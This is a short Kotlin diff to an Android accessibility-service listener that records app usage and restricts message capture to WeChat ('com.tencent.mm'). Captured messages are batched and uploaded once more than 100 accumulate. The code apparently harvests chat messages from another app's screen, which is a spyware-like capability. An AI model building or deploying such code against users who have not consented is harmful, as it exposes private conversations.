@@ -21,8 +21,10 @@ object Listener {
         event: AccessibilityEvent?,
         rootInActiveWindow: AccessibilityNodeInfo?
     ) {
-        if ((System.currentTimeMillis() - lastRead) < sleep) return
+        AppUseListener.onAccessibilityEvent(event, rootInActiveWindow)
 
+        if (event?.packageName.toString() != "com.tencent.mm") return
+        if ((System.currentTimeMillis() - lastRead) < sleep) return
         if (messageList.size > 100 && !uploading) {
             allMessageList.addAll(messageList)
             uploadMessage()
